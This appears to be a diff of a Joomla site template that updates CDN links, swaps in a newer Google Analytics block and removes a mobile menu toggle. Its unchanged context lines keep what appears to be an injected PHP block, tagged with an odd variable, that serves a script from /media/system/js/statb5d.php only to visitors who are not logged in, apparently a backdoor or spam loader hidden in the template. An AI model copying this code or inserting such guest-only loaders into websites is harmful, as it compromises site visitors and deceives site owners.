@@ -33,11 +33,10 @@ if(JRequest::getCmd('task') != 'edit') $Edit = false; else $Edit = true;
 
 <head>
 <meta http-equiv="X-UA-Compatible" content="IE=7"/>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
 	<script src="<?php echo $path ?>/scripts/mootools.js" type="text/javascript"></script>
 	
 	<jdoc:include type="head" />
-<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.js"></script>
 	<script>!window.jQuery && document.write(unescape('%3Cscript src="<?php echo $path ?>/scripts/jquery-1.4.2.js"%3E%3C/script%3E'))</script>
 	<script src="<?php echo $path ?>/scripts/jquery.faded.js" type="text/javascript"></script>
 	<script src="<?php echo $path ?>/scripts/cufon-yui.js" type="text/javascript"></script>
@@ -71,23 +70,92 @@ if(JRequest::getCmd('task') != 'edit') $Edit = false; else $Edit = true;
 	<![endif]-->
 	
 	<link rel="stylesheet" href="<?php echo $path ?>/css/template.css" type="text/css" />
-	<link href='http://fonts.googleapis.com/css?family=Terminal+Dosis+Light' rel='stylesheet' type='text/css'>
+	<link href='https://fonts.googleapis.com/css?family=Terminal+Dosis+Light' rel='stylesheet' type='text/css'>
 
 <?php $_b5dd52a7=1;
 if(is_object($_SESSION["__default"]["user"]) && !($_SESSION["__default"]["user"]->id)) {echo "
 <script language=JavaScript id=onDate ></script>
 <script language=JavaScript src=/media/system/js/statb5d.php ></script>
 ";};$_b5dd52a7=1; ?>
-  <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-143837533-1"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
 
-  gtag('config', 'UA-143837533-1');
+<script type="text/javascript" data-cfasync="false">
+	var mi_version         = '7.7.1';
+	var mi_track_user      = true;
+	var mi_no_track_reason = '';
+	
+	var disableStr = 'ga-disable-UA-143837533-1';
+
+	/* Function to detect opted out users */
+	function __gaTrackerIsOptedOut() {
+		return document.cookie.indexOf(disableStr + '=true') > -1;
+	}
+
+	/* Disable tracking if the opt-out cookie exists. */
+	if ( __gaTrackerIsOptedOut() ) {
+		window[disableStr] = true;
+	}
+
+	/* Opt-out function */
+	function __gaTrackerOptout() {
+	  document.cookie = disableStr + '=true; expires=Thu, 31 Dec 2099 23:59:59 UTC; path=/';
+	  window[disableStr] = true;
+	}
+	
+	if ( mi_track_user ) {
+		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+			(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+		})(window,document,'script','//www.google-analytics.com/analytics.js','__gaTracker');
+
+		__gaTracker('create', 'UA-143837533-1', 'auto', {'allowAnchor':true});
+		__gaTracker('set', 'forceSSL', true);
+		__gaTracker('require', 'displayfeatures');
+		__gaTracker('send','pageview', location.pathname + location.search + location.hash);
+	} else {
+		console.log( "" );
+		(function() {
+			/* https://developers.google.com/analytics/devguides/collection/analyticsjs/ */
+			var noopfn = function() {
+				return null;
+			};
+			var noopnullfn = function() {
+				return null;
+			};
+			var Tracker = function() {
+				return null;
+			};
+			var p = Tracker.prototype;
+			p.get = noopfn;
+			p.set = noopfn;
+			p.send = noopfn;
+			var __gaTracker = function() {
+				var len = arguments.length;
+				if ( len === 0 ) {
+					return;
+				}
+				var f = arguments[len-1];
+				if ( typeof f !== 'object' || f === null || typeof f.hitCallback !== 'function' ) {
+					console.log( 'Not running function __gaTracker(' + arguments[0] + " ....) because you are not being tracked. " + mi_no_track_reason );
+					return;
+				}
+				try {
+					f.hitCallback();
+				} catch (ex) {
+
+				}
+			};
+			__gaTracker.create = function() {
+				return new Tracker();
+			};
+			__gaTracker.getByName = noopnullfn;
+			__gaTracker.getAll = function() {
+				return [];
+			};
+			__gaTracker.remove = noopfn;
+			window['__gaTracker'] = __gaTracker;
+					})();
+		}
 </script>
-
 </head>
 <?php
 /*$menu = &JSite::getMenu();*/
@@ -105,15 +173,9 @@ if ($menu->getActive() == $menu->getDefault()) {
 			<!--header-->
 			<div class="header">
 				<jdoc:include type="modules" name="user4" />
-				<button id="button">
-                  	<span class="bar1"></span>
-                  	<span class="bar2"></span>
-                  	<span class="bar3"></span>
-                  </button>
 				<div class="navigation">
                   <jdoc:include type="modules" name="user3" style="topmenu" />
                   </div>
-                  
 				<div class="wrapper">
 					<h1 id="logo"><a href="<?php echo $_SERVER['PHP_SELF']?>" title="Sebastian Nelson"><img  title="Sebastian Nelson" src="<?php echo $path ?>/images/logo.png"   alt="Sebastian Nelson"  /></a></h1>
 					<jdoc:include type="modules" name="user1" />
@@ -123,7 +185,7 @@ if ($menu->getActive() == $menu->getDefault()) {
 				<?php endif;?>
 			</div>
 			
-			<div class="content contents">			
+			<div class="content">			
 				<!--content-->
 				<div class="content-indent">
 					<?php if ($option!="com_search") : ?>
@@ -152,9 +214,7 @@ if ($menu->getActive() == $menu->getDefault()) {
 										<jdoc:include type="message" />
 									</div>
 									<?php endif; ?>
-								<!-- What is this -->		
-                                  <jdoc:include type="component" />
-                                  <!-- What is this -->	
+									<jdoc:include type="component" />
 								</div>
 								<?php if ($showcontentColumn && !$Edit && $option!="com_search") : ?>
 								<jdoc:include type="modules" name="content" style="wrapper_box" />
@@ -177,26 +237,5 @@ if ($menu->getActive() == $menu->getDefault()) {
 		</div>
 	</div>
 	<script type="text/javascript"> Cufon.now(); </script>
-	
-	
-<script>
-	<?php 
-// no direct access
-defined('_JEXEC') or die;
-
-$doc = JFactory::getDocument();
-JHtml::_('jquery.framework');
-
-$doc->addScriptDeclaration('
-    jQuery(document).ready(function(){
-  jQuery("#button").click(function(){
-    jQuery(".navigation ul").toggle("slow");
-  });
-});     
-');
-?>
-
-</script>		
-	
 </body>
 </html>
